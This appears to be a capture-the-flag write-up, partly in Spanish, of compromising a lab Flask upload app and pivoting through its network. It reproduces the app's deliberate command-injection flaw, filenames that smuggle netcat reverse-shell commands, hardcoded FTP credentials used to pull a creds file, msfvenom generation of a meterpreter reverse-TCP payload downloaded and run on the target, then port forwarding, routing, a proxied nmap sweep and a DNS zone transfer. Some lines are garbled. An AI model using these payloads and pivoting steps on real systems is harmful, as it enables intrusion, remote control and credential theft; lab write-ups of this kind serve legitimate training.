                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Portfolio Modal 6 -->
  <div class="portfolio-modal modal fade" id="portfolioModal6" tabindex="-1" role="dialog" aria-labelledby="portfolioModal6Label" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">
            <i class="fas fa-times"></i>
          </span>
        </button>
        <div class="modal-body text-center">
          <div class="container">
            <div class="row justify-content-center">
              <div class="col-lg-8">
                <!-- Portfolio Modal - Title -->
                <h2 class="portfolio-modal-title text-secondary text-uppercase mb-0">Submarine</h2>
                <!-- Icon Divider -->
                <div class="divider-custom">
                  <div class="divider-custom-line"></div>
                  <div class="divider-custom-icon">
                    <i class="fas fa-star"></i>
                  </div>
                  <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Modal - Image -->
                <img class="img-fluid rounded mb-5" src="static/img/000033submarine.png" alt="">
                <!-- Portfolio Modal - Text -->
                <p class="mb-5">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam.</p>
                <button class="btn btn-primary" href="#" data-dismiss="modal">
                  <i class="fas fa-times fa-fw"></i>
                  Close Window
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript -->
  <script src="static/js/000048jquery.min.js"></script>
  <script src="static/js/000042bootstrap.bundle.min.js"></script>

  <!-- Plugin JavaScript -->
  <script src="static/js/000037jquery.easing.min.js"></script>

  <!-- Contact Form JavaScript -->
  <script src="static/js/000011jqBootstrapValidation.js"></script>
  <script src="static/js/000012contact_me.js"></script>

  <!-- Custom scripts for this template -->
  <script src="static/js/000014freelancer.min.js"></script>

</body>

bash-4.4$ cat prestart.sh
cat prestart.sh
#! /usr/bin/env sh

echo "Running inside /app/prestart.sh, you could add migrations to this file, e.g.:"

echo "
#! /usr/bin/env bash
```
```python
# Let the DB start
sleep 10;
```
```python
# Run migrations
alembic upgrade head
"

bash-4.4$ cat supervisord.pid
cat supervisord.pid
1

bash-4.4$ cat debug
cat debug
!#/bin/bash
export FLASK_APP=main.py
export DEBUG=1
flask run --host=0.0.0.0 --port=80

bash-4.4$ cat my-form.html
cat my-form.html
<!DOCTYPE html>
<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
<!-- Custom fonts for this theme -->
  <link href="static/css/000058all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" 
type="text/css">

  <!-- Theme CSS -->
  <link href="static/css/000010freelancer.min.css" rel="stylesheet">
  <title>upload</title>

</head>
<html lang="en">
  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="#page-top">Tempus Fugit Durius</a>
      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" 
type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" 
aria-label="Toggle navigation">
        Menu
        <i class="fas fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="{{ url_for('home') }}">Back</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>
<body bgcolor='#28a745'>
<header class="masthead bg-primary text-white text-center">
<div class=container d-flex align-items-center flex-column>
    <center><h1>Upload script</h1>
    <form action="/upload" method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="my-form" value="Upload !">
    </form></center>
</div>
</header>
<p>
	{% with messages = get_flashed_messages() %}
	  {% if messages %}
		<ul class=flashes>
		{% for message in messages %}
		  <li>{{ message }}</li>
		{% endfor %}
		</ul>
	  {% endif %}
	{% endwith %}
</p>

</body>
</html>

bash-4.4$ cd upload
cd upload
bash-4.4$ ls
ls
a.txt;nc 168301415 -e sh       a.txt;nc 168301415 443 -e ssh
a.txt;nc 168301415 443 -e sh   test.txt;nc 168301415 -e bash

bash-4.4$ cat main.cpython-36.pyc

or uploading�zThat filename was way too long!zcat r	T)r
                                                           zutf-8z�File successfully uploadedz
                                                                                              ftp.mofo.pwnsomeud

bash-4.4$ cat uwsgi.ini
cat uwsgi.ini
[uwsgi]
module = main
callable = app
uid=www
gid=www

bash-4.4$ cat main.py
cat main.py
import os
import urllib.request
from flask import Flask, flash, request, redirect, render_template
from ftplib import FTP
import subprocess

UPLOAD_FOLDER = 'upload'
ALLOWED_EXTENSIONS = {'txt', 'rtf'}

app = Flask(__name__)
app.secret_key = "mofosecret"
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
      cmd = 'fortune'
      result = subprocess.check_output(cmd, shell=True)
      return "<h1>400 - Sorry. I didn't find what you where looking for.</h1> <h2>Maybe this will cheer you up:</h2><h3>"+result.decode("utf-8")+"</h3>"
@app.errorhandler(500)
def internal_error(error):
    return "<h1>500?! - What are you trying to do here?!</h1>"

@app.route('/')

def home():
	return render_template('index.html')
	

@app.route('/upload')

def upload_form():
	try:
	    return render_template('my-form.html')
	except Exception as e:
	    return render_template("500.html", error = str(e))

def allowed_file(filename):
           check = filename.rsplit('.', 1)[1].lower()
           check = check[:3] in ALLOWED_EXTENSIONS    
           return check

def filtering(filename):
           filtered = filename.replace("#","")
           return filtered

@app.route('/upload', methods=['POST'])
def upload_file():
	if request.method == 'POST':

		if 'file' not in request.files:
			flash('No file part')
			return redirect(request.url)
		file = request.files['file']
		if file.filename == '':
			flash('No file selected for uploading')
			return redirect(request.url)
		if len(file.filename) > 30:
			flash('That filename was way too long!')
			return redirect(request.url)
 
		if file.filename and allowed_file(file.filename):
			filename = file.filename
			filename = filtering(filename)
			file.save(os.path.join(UPLOAD_FOLDER, filename))
			cmd="cat "+UPLOAD_FOLDER+"/"+filename
			result = subprocess.check_output(cmd, shell=True)
			flash(result.decode("utf-8"))
			flash('File successfully uploaded')
			
			try:
			   ftp = FTP('ftp.mofo.pwn')
			   ftp.login('someuser', '04653cr37Passw0rdK06')
			   with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f:
			      ftp.storlines('STOR %s' % filename, f)
			      ftp.quit()
			      os.remove(UPLOAD_FOLDER+"/"+filename)
			except:
			   flash("Cannot connect to FTP-server")
			return redirect('/upload')

		else:
			flash('Allowed file types are txt and rtf')
			return redirect(request.url)

if __name__ == "__main__":
    app.run()

ftp = FTP('ftp.mofo.pwn')
ftp.login('someuser', '04653cr37Passw0rdK06')
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ftp 10.10.238.9  
ftp: Can't connect to `10.10.238.9:21': Connection refused
ftp: Can't connect to `10.10.238.9:ftp'

bash-4.4$ ftp 10.10.238.9
ftp 10.10.238.9
bash: ftp: command not found

using python
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cat ftp.py       
#!/usr/bin/python

from ftplib import FTP

ftp = FTP()
ftp.connect("ftp.mofo.pwn", 21)
ftp.login("someuser", "04653cr37Passw0rdK06")
ftp.retrlines("LIST",lambda line: print(line))
ftp.quit()

└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.238.9 - - [26/Jan/2023 13:39:16] "GET /ftp.py HTTP/1.1" 200 -

bash-4.4$ wget http://10.8.19.103:8000/ftp.py
wget http://10.8.19.103:8000/ftp.py
Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
ftp.py               100% |*******************************|   187   0:00:00 ETA
bash-4.4$ python3 ftp.py
python3 ftp.py
-rw-------    1 ftp      ftp             2 Jan 26 18:06 a.txt
-rw-------    1 ftp      ftp            24 Apr 22  2020 creds.txt
-rw-------    1 ftp      ftp            26 Jan 26 17:50 file.txt;id
-rw-------    1 ftp      ftp             4 Jan 26 17:51 test.txt
-rw-------    1 ftp      ftp             4 Jan 26 17:52 test.txt;id
-rw-------    1 ftp      ftp            13 Jan 26 17:54 test2.txt

thanks chatGPT

Para realizar un login FTP con Python, se puede utilizar la biblioteca ftplib que proporciona Python.
Se utiliza el método "connect" para conectarse al servidor ftp.mofo.pwn en el puerto 21, que es el puerto predeterminado para FTP.

Luego, se utiliza el método "login" para iniciar sesión en el servidor con el nombre de usuario y contraseña proporcionados.

El método "retrlines" de la biblioteca ftplib de Python se utiliza para recibir líneas de texto desde el servidor FTP.
La lista devuelta se pasa a una función lambda que imprime cada línea recibida. Finalmente, se utiliza el método "quit" para cerrar la conexión con el servidor.

with open("creds.txt", "wb") as local_file:
    ftp.retrbinary("RETR creds.txt", local_file.write)

En este ejemplo, se abre un archivo "creds.txt" en modo binario (wb) y se almacena en una variable "local_file". Luego se utiliza el método "retrbinary" para descargar el archivo "creds.txt" del servidor. El primer argumento es "RETR creds.txt" que indica al servidor que queremos descargar el archivo "creds.txt", y el segundo argumento es "local_file.write" que indica dónde se debe guardar el archivo descargado.

finally
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cat ftp.py                                              
#!/usr/bin/python

from ftplib import FTP

ftp = FTP()
ftp.connect("ftp.mofo.pwn", 21)
ftp.login("someuser", "04653cr37Passw0rdK06")
ftp.retrlines("LIST",lambda line: print(line))
with open("creds.txt", "wb") as local_file:
    ftp.retrbinary("RETR creds.txt", local_file.write)
ftp.quit()
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.219.88 - - [26/Jan/2023 13:57:48] "GET /ftp.py HTTP/1.1" 200 -

ash-4.4$ wget http://10.8.19.103:8000/ftp.py
wget http://10.8.19.103:8000/ftp.py
Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
ftp.py               100% |*******************************|   290   0:00:00 ETA
bash-4.4$ python3 ftp.py
python3 ftp.py
-rw-------    1 ftp      ftp            24 Apr 22  2020 creds.txt
bash-4.4$ cat creds.txt
cat creds.txt
admin:BAraTuwwWzx3gG

possible admin panel login credentials.

cd /home
bash-4.4$ ls
ls
www
bash-4.4$ cd www
cd www
bash-4.4$ ls
ls
bash-4.4$ ls -lah
ls -lah
total 8
drwxr-sr-x    2 www      www         4.0K Apr 22  2020 .
drwxr-xr-x    3 root     root        4.0K Apr 22  2020 ..

bash-4.4$ ls -lah
ls -lah
total 76
drwxr-xr-x  146 root     root        4.0K Apr 22  2020 .
drwxr-xr-x  146 root     root        4.0K Apr 22  2020 ..
-rwxr-xr-x    1 root     root           0 Apr 22  2020 .dockerenv
drwxr-xr-x   28 www      www         4.0K Jan 26 18:57 app
drwxr-xr-x    2 root     root        4.0K Aug  8  2019 bin
drwxr-xr-x    5 root     root         360 Jan 26 18:44 dev
-rwxr-xr-x    1 root     root        1.8K May 17  2019 entrypoint.sh
drwxr-xr-x   55 root     root        4.0K Apr 22  2020 etc
drwxr-xr-x    3 root     root        4.0K Apr 22  2020 home
drwxr-xr-x   16 root     root        4.0K Apr 22  2020 lib
drwxr-xr-x    5 root     root        4.0K Jan 30  2019 media
drwxr-xr-x    2 root     root        4.0K Jan 30  2019 mnt
dr-xr-xr-x   97 root     root           0 Jan 26 18:44 proc
drwx------    9 root     root        4.0K Aug 16  2019 root
drwxr-xr-x    2 root     root        4.0K Jan 26 18:44 run
drwxr-xr-x    2 root     root        4.0K Aug 11  2019 sbin
drwxr-xr-x    2 root     root        4.0K Jan 30  2019 srv
-rwxr-xr-x    1 root     root         404 May 16  2019 start.sh
dr-xr-xr-x   13 root     root           0 Jan 26 18:44 sys
drwxrwxrwt    2 root     root        4.0K Jan 26 18:44 tmp
drwxr-xr-x   59 root     root        4.0K Apr 22  2020 usr
-rwxr-xr-x    1 root     root        2.9K May 16  2019 uwsgi-nginx-entrypoint.sh
drwxr-xr-x   40 root     root        4.0K Apr 22  2020 var

we are in a docker container

.dockerenv

bash-4.4$ ip add
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
9: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:c0:a8:96:0a brd ff:ff:ff:ff:ff:ff
    inet 192.168.150.10/24 brd 192.168.150.255 scope global eth0
       valid_lft forever preferred_lft forever
bash-4.4$ netstat -anp
netstat -anp
netstat: showing only processes with your user ID
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.11:38865        0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.150.10:34441    10.8.19.103:443         ESTABLISHED 18/sh
udp        0      0 127.0.0.11:44396        0.0.0.0:*                           -
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
unix  2      [ ACC ]     STREAM     LISTENING      14611 -                   /tmp/uwsgi.sock
unix  2      [ ACC ]     STREAM     LISTENING      14567 -                   /run/supervisord.sock.1

using metasploit
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

       =[ metasploit v6.2.33-dev                          ]
+ -- --=[ 2275 exploits - 1192 auxiliary - 406 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt
Metasploit Documentation: https://docs.metasploit.com/
```
```python
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```python
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
```
```python
msf6 exploit(multi/handler) > set LHOST 10.8.19.103
LHOST => 10.8.19.103
```
```python
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
```
```python
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.19.103:4444
```

## Exploitation
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ msfvenom -p /linux/x86/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT=4444 -f elf > shell.elf
Error: invalid payload: /linux/x86/meterpr┌─┌┌┌┌┌┌─┌┌┌┌┌┌┌┌┌┌┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT=4444 -f elf > shell.elf 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ls                                
'a.txt;nc 168301415 443 -e sh'   ftp.py   shell.elf
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ python3 -m http.server 8000 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.36.116 - - [26/Jan/2023 16:49:59] "GET /shell.elf HTTP/1.1" 200 -

bash-4.4$ wget http://10.8.19.103:8000/shell.elf
wget http://10.8.19.103:8000/shell.elf
Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
shell.elf            100% |*******************************|   207   0:00:00 ETA
bash-4.4$ chmod +x shell.elf
chmod +x shell.elf
bash-4.4$ ./shell.elf
./shell.elf
```
```python
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] Sending stage (1017704 bytes) to 10.10.36.116
[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.36.116:38760) at 2023-01-26 16:50:27 -0500
```
```python
meterpreter > ipconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0

Interface  9
============
Name         : eth0
Hardware MAC : 02:42:c0:a8:96:0a
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.150.10
IPv4 Netmask : 255.255.255.0

What we can see here is, there is another host up located in **Interface 9** with IP address **“192.168.150.10”**. At this point, we need to escape from this container and access to the host located on **Interface 9**. In order to do that, we need to do **port forwarding**

El reenvío de puertos es una técnica utilizada para redirigir el tráfico de red desde un puerto específico de un dispositivo de red, como un router, a otro dispositivo en la red. Esto se utiliza a menudo para permitir que los dispositivos en una red privada, como una computadora personal o un servidor, sean accesibles desde Internet.

Un ejemplo común de uso de reenvío de puertos es configurar un servidor web en su red privada para que pueda ser accedido desde Internet. Sin el reenvío de puertos, los visitantes de su sitio web solo podrían acceder a él si estuvieran en su red privada. Sin embargo, configurando el reenvío de puertos en su router para redirigir el tráfico del puerto 80 (el puerto utilizado por defecto para el protocolo HTTP) a su servidor web, los visitantes de su sitio web podrán acceder a él desde cualquier lugar.

Un ejemplo concreto sería, si tienes un servidor web en tu red privada con la dirección IP 192.168.1.100 y quieres que los visitantes de Internet puedan acceder a él a través del puerto 80. Entonces, configurarías el reenvío de puertos en tu router para redirigir todo el tráfico entrante al puerto 80 a la dirección IP 192.168.1.100. De esta manera, cuando alguien escriba tu dirección IP pública en su navegador y acceda al puerto 80, su tráfico será redirigido al servidor web en tu red privada.

Una de las funciones de Meterpreter es el reenvío de puertos (port forwarding). Esto permite a un atacante redirigir el tráfico desde un puerto específico en un sistema comprometido a otro sistema en la red.

Para utilizar la función de reenvío de puertos de Meterpreter, primero debes obtener acceso a un sistema comprometido utilizando una de las muchas técnicas de explotación disponibles en Metasploit. Una vez que se ha obtenido acceso, se puede utilizar el comando "portfwd" para establecer una regla de reenvío de puertos.

Un ejemplo de uso sería:
```
```python
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100

En este ejemplo, se establece una regla para redirigir todo el tráfico entrante al puerto 3389 (el puerto utilizado para conectarse a un sistema Windows mediante RDP) al sistema con la dirección IP 192.168.1.100 en la red interna.
```
```python
meterpreter > portfwd add -l 8888 -p 80 -r 192.168.150.10
[*] Forward TCP relay created: (local) :8888 -> (remote) 192.168.150.10:80

http://localhost:8888/ (Tempus Fugit Durius)

At this point, we need to discover other hosts on **“192.168.150.0/24”** **subnet.**

"meterpreter run autoroute" es un comando de Meterpreter que se utiliza para automatizar la configuración de una ruta de red en un sistema comprometido. Este comando utiliza la herramienta "route" para establecer una ruta para una subred específica a través de un gateway específico, lo que permite a un atacante acceder a sistemas y redes adicionales una vez que se ha comprometido un sistema inicial.

El flag "-p" es para indicar que se quiere hacer una ruta persistente, es decir que se mantendra activa después de un reinicio del sistema.

Ejemplo:
```
```python
meterpreter > run autoroute -s 192.168.1.0/24 -n 192.168.1.1 -p

En este ejemplo, se establece una ruta para la subred 192.168.1.0/24 a través del gateway 192.168.1.1. Y se establece como persistente.
```
```python
meterpreter > search -f resolv.conf
Found 1 result...
=================

Path              Size (bytes)  Modified (UTC)
----              ------------  --------------
/etc/resolv.conf  54            2023-01-26 15:59:24 -0500
```
```python
meterpreter > cat /etc/resolv.conf
search mofo.pwn
nameserver 127.0.0.11
options ndots:0
```
```python
meterpreter > background

https://infinitelogins.com/2021/02/20/using-metasploit-routing-and-proxychains-for-pivoting/
```
```python
msf6 post(multi/manage/autoroute) > sessions

Active sessions
===============

  Id  Name  Type                   Information           Connection
  --  ----  ----                   -----------           ----------
  1         meterpreter x86/linux  www @ 192.168.150.10  10.8.19.103:4444 -> 10.10.36.116:38988 (192.168.150.10)
  2         meterpreter x86/linux  www @ 192.168.150.10  10.8.19.103:4444 -> 10.10.36.116:38989 (192.168.150.10)
```
```python
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, def
                                       ault)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

View the full module info with the info, or info -d command.
```
```python
msf6 post(multi/manage/autoroute) > set SUBNET 102.168.150.0/24
SUBNET => 102.168.150.0/24
```
```python
msf6 post(multi/manage/autoroute) > set SESSION 2
SESSION => 2
```
```python
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   CMD      autoadd           yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, de
                                        fault)
   NETMASK  255.255.255.0     no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  2                 yes       The session to run this module on
   SUBNET   102.168.150.0/24  no        Subnet (IPv4, for example, 10.10.10.0)

View the full module info with the info, or info -d command.
```
```python
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 192.168.150.10
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.150.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```
```python
msf6 post(multi/manage/autoroute) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.150.0      255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ tail /etc/proxychains.conf 
#
```
```python
#       proxy types: http, socks4, socks5
```
```python
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
```
```python
# add proxy here ...
```
```python
# meanwile
```
```python
# defaults set to "tor"
#socks4 127.0.0.1 9050	
socks5 127.0.0.1 9050
```
```python
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
```
```python
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an addres
                                        s on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

View the full module info with the info, or info -d command.
```
```python
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
```
```python
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an addres
                                        s on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   9050             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

View the full module info with the info, or info -d command.
```
```python
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ sudo proxychains nmap -n -sT -Pn -p 22,80 192.168.150.0/24 
[sudo] password for kali: 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 17:56 EST
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.1:80  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.4:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.7:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.10:80  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.11:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.14:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.17:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.20:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.23:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.26:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.29:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.32:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.35:80 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.38:80 

Found 
 
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  192.168.150.1:80  ...  OK

now portforwarding
```
```python
meterpreter > portfwd add -l 8888 -p 80 -r 192.168.150.1
[*] Forward TCP relay created: (local) :8888 -> (remote) 192.168.150.1:80

http://localhost:8888/ (More Focus)

https://www.howtouselinux.com/post/dns-port
dig axfr mofo.pwn

This appears to be a command to perform a zone transfer (AXFR) of a DNS zone using the dig (Domain Information Groper) tool. The domain specified is "mofo.pwn," which may be a placeholder for a real domain. However, I would like to remind you that unauthorized access to someone else's DNS zone is considered illegal, and please refrain from any illegal activities.

AXFR (Full Zone Transfer) es un protocolo de DNS que permite a un servidor de DNS secundario obtener una copia completa de una zona de DNS de un servidor primario autorizado. Esto se utiliza para mantener la consistencia de la información de DNS entre los servidores primario y secundario. Sin embargo, es importante tener en cuenta que los servidores de DNS deben estar configurados correctamente para permitir las transferencias de zona y sólo los servidores de DNS autorizados deben tener acceso a ellas.
```
```python
meterpreter > shell
Process 28 created.
Channel 11 created.
 
dig axfr mofo.pwn

; <<>> DiG 9.11.8 <<>> axfr mofo.pwn
;; global options: +cmd
mofo.pwn.		14400	IN	SOA	ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
mofo.pwn.		14400	IN	TXT	"v=spf1 ip4:176.23.46.22 a mx ~all"
mofo.pwn.		14400	IN	NS	ns1.mofo.pwn.
durius.mofo.pwn.	14400	IN	A	192.168.150.1
ftp.mofo.pwn.		14400	IN	CNAME	punk.mofo.pwn.
gary.mofo.pwn.		14400	IN	A	192.168.150.15
geek.mofo.pwn.		14400	IN	A	192.168.150.14
